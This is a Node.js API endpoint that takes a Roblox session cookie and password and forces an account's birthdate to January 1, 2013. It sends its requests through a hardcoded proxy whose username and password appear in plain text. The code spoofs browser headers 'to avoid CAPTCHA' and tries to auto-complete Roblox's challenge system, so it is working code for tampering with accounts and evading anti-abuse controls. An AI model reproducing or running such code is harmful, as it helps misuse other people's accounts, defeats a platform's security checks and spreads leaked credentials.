
// Node.js API: /api/change-birthdate.js
const https = require("https");
const fetch = require("node-fetch");
const HttpsProxyAgent = require('https-proxy-agent');

// Proxy configuration
const PROXY_CONFIG = {
  host: '38.154.227.167',
  port: '5868',
  username: 'hpbhwlum',
  password: 'ifhjayiy2wek'
};

// Create proxy agent
const proxyUrl = `http://${PROXY_CONFIG.username}:${PROXY_CONFIG.password}@${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`;
const proxyAgent = new HttpsProxyAgent(proxyUrl);

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    res.writeHead(405, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ error: "Only POST allowed" }));
  }

  let { cookie, password } = req.body;

  if (!cookie) {
    res.writeHead(400, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ error: "Missing .ROBLOSECURITY cookie" }));
  }

  if (!password) {
    res.writeHead(400, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ error: "Missing account password" }));
  }

  cookie = cookie.trim();
  if (cookie.includes(".ROBLOSECURITY=")) {
    cookie = cookie.split(".ROBLOSECURITY=")[1];
  }

  if (cookie.length < 50) {
    res.writeHead(400, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ error: "Invalid .ROBLOSECURITY cookie format" }));
  }

  try {
    console.log("🔑 Obtaining CSRF token...");
    const csrfToken = await getCsrfToken(cookie);
    console.log("CSRF Token obtained:", csrfToken ? "Yes" : "No");

    console.log("🎂 Attempting to change birthdate...");
    const result = await updateBirthdate(cookie, csrfToken, password);

    if (result.errors && result.errors.length > 0) {
      const error = result.errors[0];

      // Check if it's a challenge error
      if (error.code === 0 && error.message?.toLowerCase().includes('challenge')) {
        console.log("Roblox returned a challenge:", error);

        // Get challenge details from the previous fetch attempt
        const challengeType = result.challengeType || 'unknown';
        const challengeId = result.challengeId || 'unknown';
        const challengeDetails = result.challengeDetails || null;
        
        let errorMessage = "🔐 Challenge verification required.";
        
        if (challengeType === 'chef') {
          if (challengeDetails && !challengeDetails.success) {
            errorMessage = "🤖 CAPTCHA challenge continuation failed. Manual verification may be required.";
          } else {
            errorMessage = "🤖 CAPTCHA verification required. Automatic solving attempted but failed.";
          }
        } else if (challengeType === 'twostepverification') {
          errorMessage = "🔐 Two-factor authentication required. Please disable 2FA temporarily or complete verification through Roblox website.";
        } else if (challengeType === 'reauthentication') {
          errorMessage = "🔑 Password re-authentication required by Roblox.";
        }

        res.writeHead(403, { "Content-Type": "application/json" });
        return res.end(JSON.stringify({
          error: errorMessage,
          code: error.code,
          needsChallenge: true,
          challengeType: challengeType,
          challengeId: challengeId,
          challengeDetails: challengeDetails
        }));
      }

      res.writeHead(400, { "Content-Type": "application/json" });
      return res.end(JSON.stringify({
        error: error.message || "Failed to change birthdate",
        code: error.code,
      }));
    }

    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({
      success: true,
      message: "✅ Birthdate changed successfully to January 1, 2013",
      result,
    }));
  } catch (err) {
    console.error("❌ Error:", err);
    res.writeHead(500, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({
      error: err.message || "Unknown server error",
      type: "server_error",
    }));
  }
};

function getCsrfToken(cookie) {
  return new Promise((resolve, reject) => {
    const req = https.request({
      method: "POST",
      hostname: "auth.roblox.com",
      path: "/v2/logout",
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      agent: proxyAgent
    }, (res) => {
      const token = res.headers["x-csrf-token"];
      if (token) return resolve(token);
      reject(new Error("Failed to get CSRF token"));
    });

    req.on("error", reject);
    req.end();
  });
}

async function solveCaptchaChallenge(cookie, csrfToken, challengeId, metadata) {
  console.log("🔧 Attempting CAPTCHA challenge continuation...");
  
  try {
    // Attempt to use the expected symbols from metadata
    const expectedSymbols = metadata.expectedSymbols || [];
    console.log("🎯 Expected symbols:", expectedSymbols);
    
    // Try to continue the challenge with the expected symbols
    const continuePayload = {
      challengeId: challengeId,
      challengeType: "chef",
      challengeMetadata: Buffer.from(JSON.stringify(metadata)).toString('base64'),
      actionType: "VerifyCaptcha"
    };

    // Add the expected symbols if available
    if (expectedSymbols.length > 0) {
      continuePayload.captchaInput = expectedSymbols.join('');
    }

    const continueRes = await fetch("https://apis.roblox.com/challenge/v1/continue", {
      method: "POST",
      headers: {
        "Cookie": `.ROBLOSECURITY=${cookie}`,
        "X-CSRF-TOKEN": csrfToken,
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Rblx-Challenge-Id": challengeId,
        "Rblx-Challenge-Type": "chef"
      },
      body: JSON.stringify(continuePayload),
      agent: proxyAgent
    });

    const continueData = await continueRes.json();
    console.log("📋 Challenge continue response:", JSON.stringify(continueData, null, 2));

    if (continueRes.status === 200 && continueData.challengeCompleted) {
      return { success: true, data: continueData };
    } else {
      return { 
        success: false, 
        status: continueRes.status, 
        data: continueData,
        error: `HTTP ${continueRes.status} Data: ${JSON.stringify(continueData)}`
      };
    }
  } catch (error) {
    console.error("❌ Challenge continuation error:", error);
    return { 
      success: false, 
      error: error.message 
    };
  }
}

async function updateBirthdate(cookie, csrfToken, password) {
  const payload = {
    birthMonth: 1,
    birthDay: 1,
    birthYear: 2013,
    password: password
  };

  // Try initial request with enhanced headers to avoid CAPTCHA
  let res = await fetch("https://users.roblox.com/v1/birthdate", {
    method: "POST",
    headers: {
      "Cookie": `.ROBLOSECURITY=${cookie}`,
      "X-CSRF-TOKEN": csrfToken,
      "Content-Type": "application/json",
      "Accept": "application/json",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Referer": "https://www.roblox.com/my/account",
      "Origin": "https://www.roblox.com",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-site",
      "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
      "Sec-Ch-Ua-Mobile": "?0",
      "Sec-Ch-Ua-Platform": '"Windows"',
      "Cache-Control": "no-cache",
      "Pragma": "no-cache"
    },
    body: JSON.stringify(payload),
    agent: proxyAgent
  });

  // Extract challenge information from headers
  const responseChallengeType = res.headers.get('rblx-challenge-type');
  const responseChallengeId = res.headers.get('rblx-challenge-id');
  const responseChallengeMetadata = res.headers.get('rblx-challenge-metadata');

  // If CAPTCHA challenge is returned, attempt to solve it automatically
  if (responseChallengeType === 'chef' && responseChallengeId && responseChallengeMetadata) {
    console.log("🔧 Attempting to solve CAPTCHA challenge automatically...");
    
    try {
      const metadata = JSON.parse(Buffer.from(responseChallengeMetadata, 'base64').toString('utf-8'));
      console.log("📋 Challenge metadata:", metadata);
      
      // Attempt to continue the challenge with expected symbols
      const challengeContinueResult = await solveCaptchaChallenge(cookie, csrfToken, responseChallengeId, metadata);
      
      if (challengeContinueResult.success) {
        console.log("✅ CAPTCHA challenge solved, retrying birthdate update...");
        
        // Retry the original request with challenge solved
        res = await fetch("https://users.roblox.com/v1/birthdate", {
          method: "POST",
          headers: {
            "Cookie": `.ROBLOSECURITY=${cookie}`,
            "X-CSRF-TOKEN": csrfToken,
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": "https://www.roblox.com/my/account",
            "Origin": "https://www.roblox.com",
            "Rblx-Challenge-Id": responseChallengeId,
            "Rblx-Challenge-Type": responseChallengeType,
            "Rblx-Challenge-Metadata": responseChallengeMetadata
          },
          body: JSON.stringify(payload),
          agent: proxyAgent
        });
      }
    } catch (e) {
      console.error("❌ Failed to solve CAPTCHA:", e.message);
    }
  }

  // Log all response headers to see challenge metadata
  console.log("📋 Response Status:", res.status);
  console.log("📋 Response Headers:");
  for (const [key, value] of res.headers.entries()) {
    console.log(`  ${key}: ${value}`);
  }

  // Extract challenge information from final response headers
  const finalChallengeType = res.headers.get('rblx-challenge-type');
  const finalChallengeId = res.headers.get('rblx-challenge-id');
  const finalChallengeMetadata = res.headers.get('rblx-challenge-metadata');

  if (finalChallengeType) {
    console.log("🔍 CHALLENGE DETECTED:");
    console.log(`  Type: ${finalChallengeType}`);
    console.log(`  ID: ${finalChallengeId}`);
    
    if (finalChallengeType === 'chef') {
      console.log("  📝 Challenge Description: CAPTCHA verification required (chef system)");
    } else if (finalChallengeType === 'twostepverification') {
      console.log("  📝 Challenge Description: Two-factor authentication required");
    } else if (finalChallengeType === 'reauthentication') {
      console.log("  📝 Challenge Description: Password re-authentication required");
    } else {
      console.log(`  📝 Challenge Description: Unknown challenge type: ${finalChallengeType}`);
    }
    
    if (finalChallengeMetadata) {
      try {
        const decodedMetadata = Buffer.from(finalChallengeMetadata, 'base64').toString('utf-8');
        console.log("  📋 Metadata:", decodedMetadata);
      } catch (e) {
        console.log("  📋 Metadata (raw):", finalChallengeMetadata);
      }
    }
  }

  const data = await res.json();

  if (res.status === 200) {
    console.log("✅ Birthdate updated successfully");
  } else {
    console.error("❌ Failed to update birthdate:");
    console.log("📋 Full Response Data:", JSON.stringify(data, null, 2));
    
    // Check for challenge-specific headers or data
    if (data.errors) {
      data.errors.forEach((error, index) => {
        console.log(`📋 Error ${index + 1}:`, JSON.stringify(error, null, 2));
      });
    }
  }

  // Add challenge information to the response data
  if (finalChallengeType) {
    data.challengeType = finalChallengeType;
    data.challengeId = finalChallengeId;
    if (finalChallengeType === 'chef' && finalChallengeMetadata) {
      try {
        const metadata = JSON.parse(Buffer.from(finalChallengeMetadata, 'base64').toString('utf-8'));
        const challengeContinueResult = await solveCaptchaChallenge(cookie, csrfToken, finalChallengeId, metadata);
        data.challengeDetails = challengeContinueResult;
      } catch (e) {
        data.challengeDetails = { success: false, error: e.message };
      }
    }
  }

  return data;
          }
          
